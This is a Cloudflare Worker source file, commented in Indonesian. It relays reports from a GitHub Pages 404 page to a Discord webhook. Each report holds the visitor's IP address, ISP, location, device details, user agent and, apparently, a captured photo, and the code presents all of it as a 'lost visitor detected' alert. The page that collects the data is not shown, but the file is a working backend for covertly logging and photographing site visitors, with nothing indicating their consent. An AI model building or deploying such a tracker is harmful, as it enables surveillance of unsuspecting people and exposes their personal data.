/**
 * Cloudflare Worker — Isekai Discord Notifier
 * Terima POST dari 404.html (JSON atau multipart+foto) → kirim embed ke Discord.
 * DISCORD_WEBHOOK_URL disimpan sebagai Worker Secret.
 */

/* Hanya izinkan request dari GitHub Pages site ini */
const ALLOWED_ORIGIN = "https://yumelyrics.github.io";

const CORS = {
  "Access-Control-Allow-Origin": ALLOWED_ORIGIN,
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

function s(v, max = 200) {
  if (v == null || v === "") return "—";
  return String(v).replace(/[\x00-\x1F\x7F]/g, " ").slice(0, max);
}

function waktuWIB() {
  try {
    return new Date().toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      day: "2-digit", month: "long", year: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit",
    }) + " WIB";
  } catch (_) {
    return new Date().toISOString();
  }
}

function buildEmbed(data, hasPhoto) {
  const ip       = s(data.ip, 45);
  const isp      = s(data.isp);
  const lokasi   = s(data.lokasi);
  const tz       = s(data.timezone, 60);
  const platform = s(data.platform, 60);
  const lang     = s(data.language, 20);
  const res      = `${s(data.screenW, 8)}×${s(data.screenH, 8)} (${s(data.pixelRatio, 4)}×)`;
  const url      = s(data.url, 512);
  const ref      = data.referrer ? s(data.referrer, 512) : null;
  const ua       = s(data.userAgent, 180);

  const fields = [
    { name: "🌐 IP",        value: `\`${ip}\``,  inline: true },
    { name: "🏢 ISP",       value: isp,           inline: true },
    { name: "📍 Lokasi",    value: lokasi,         inline: true },
    { name: "🕐 Timezone",  value: tz,             inline: true },
    { name: "💻 Platform",  value: platform,       inline: true },
    { name: "🖥️ Resolusi",  value: res,            inline: true },
    { name: "🌍 Bahasa",    value: lang,           inline: true },
    { name: "📸 Foto",      value: hasPhoto ? "✅ Tertangkap" : "❌ Tidak ada", inline: true },
    { name: "\u200b",       value: "\u200b",       inline: true }, // spacer
    { name: "🔗 URL",       value: url,            inline: false },
  ];

  if (ref) {
    fields.push({ name: "↩️ Referrer", value: ref, inline: false });
  }

  fields.push({ name: "📱 User Agent", value: `\`\`\`${ua}\`\`\``, inline: false });

  const embed = {
    color:  0xFF6FB0,
    author: { name: "🌸 Pengunjung Tersesat Terdeteksi!" },
    fields,
    footer: { text: `Isekai Guild 🎴 • ${waktuWIB()}` },
  };

  if (hasPhoto) {
    embed.image = { url: "attachment://visitor.jpg" };
  }

  return embed;
}

export default {
  async fetch(request, env) {
    if (request.method === "OPTIONS") {
      return new Response(null, { status: 204, headers: CORS });
    }
    if (request.method !== "POST") {
      return new Response("Method Not Allowed", { status: 405, headers: CORS });
    }

    /* Blokir request dari origin yang tidak dikenal */
    const origin = request.headers.get("Origin") || "";
    if (origin !== ALLOWED_ORIGIN) {
      return new Response("Forbidden", { status: 403, headers: CORS });
    }

    const webhookUrl = env.DISCORD_WEBHOOK_URL;
    if (!webhookUrl) {
      return new Response("OK (no webhook)", { status: 200, headers: CORS });
    }

    const ct = request.headers.get("Content-Type") || "";
    let data, photoFile = null;

    try {
      if (ct.includes("multipart/form-data")) {
        const form = await request.formData();
        data      = JSON.parse(form.get("data") || "{}");
        photoFile = form.get("photo") || null;         // File / Blob
      } else if (ct.includes("application/json")) {
        data = await request.json();
      } else {
        return new Response("Bad Request", { status: 400, headers: CORS });
      }
    } catch {
      return new Response("Invalid payload", { status: 400, headers: CORS });
    }

    const embed = buildEmbed(data, !!photoFile);

    try {
      let discordRes;
      if (photoFile) {
        // Kirim embed + foto sebagai multipart ke Discord
        const df = new FormData();
        df.append(
          "payload_json",
          JSON.stringify({ username: "Isekai Guild 🎴", embeds: [embed] })
        );
        df.append("files[0]", photoFile, "visitor.jpg");
        discordRes = await fetch(webhookUrl, { method: "POST", body: df });
      } else {
        discordRes = await fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username: "Isekai Guild 🎴", embeds: [embed] }),
        });
      }

      if (!discordRes.ok) {
        console.error("Discord error:", discordRes.status, await discordRes.text());
      }
    } catch (err) {
      console.error("Fetch error:", err);
    }

    return new Response("OK", { status: 200, headers: CORS });
  },
};
